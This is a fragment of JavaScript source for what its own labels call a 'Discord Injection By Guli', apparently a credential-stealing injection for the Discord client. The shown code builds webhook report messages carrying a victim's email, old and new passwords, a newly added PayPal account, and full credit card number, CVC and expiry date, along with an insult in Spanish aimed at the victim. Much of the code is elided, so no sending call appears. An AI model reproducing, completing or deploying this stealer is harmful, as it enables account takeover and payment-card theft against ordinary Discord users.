...
const config = {
  ...
  ping_on_run: true, 
  ping_val: '@everyone',
  embed_name: 'mithrandir Injection By Guli', 
  embed_icon: 'https://cdn.discordapp.com/attachments/1053561532165931079/1085372977803178025/discord-avatar-512-2MUDJ.png?size=4096'.replace(/ /g, '%20'), 
  embed_color: 2895667, 
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection By Guli Gor Ro0ster',
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        fields: [
          {
            ...
            value: `Email: **${json.email}**\nPassword Vieja: **${oldpassword}**\nNueva Password: **${newpassword}**`,
            inline: true,
          },
          {
            name: '**Discord Info**',
        ...
        footer: {
          text: '🎉・Discord Injection By Guli For Ro0ster',
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '**Paypal Añadido**',
            value: `Tiempo De Comprar Un Nitro Perra 😩`,
            inline: false,
          },
          {
            name: '**Discord Info**',
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '**Credit Card Añadida**',
            value: `Numero De Tarjeta: **${number}**\nCVC: **${cvc}**\nExpiracion De La Tarjeta: **${expir_month}/${expir_year}**`,
            inline: true,
          },
          {
            name: '**Discord Info**',
